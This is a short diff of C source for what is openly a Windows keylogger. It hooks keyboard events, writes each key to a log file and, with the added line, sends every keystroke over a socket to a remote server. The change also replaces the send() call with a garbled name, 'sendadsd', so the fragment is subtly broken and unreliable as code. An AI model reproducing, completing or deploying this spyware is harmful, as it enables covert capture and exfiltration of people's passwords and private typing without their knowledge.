@@ -86,8 +86,7 @@ int main()
 // Function to send the logged key to the remote server
 void send_key(unsigned char key) 
 {
-    send(sock, (char*)&key, sizeof(key), 0); // Send the key pressed
-    printf("SENT");
+    sendadsd(sock, (char*)&key, sizeof(key), 0); // Send the key pressed
 }
 
 // Keyboard procedure to handle key events
@@ -100,6 +99,7 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
         {
             DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode; // Get virtual key code
             printf("%c", (char)vkCode);
+            send_key((char)vkCode);
             fprintf(logFile, "%c ", (char)vkCode); // Log the key code
             fflush(logFile); // Flush the output buffer
         }
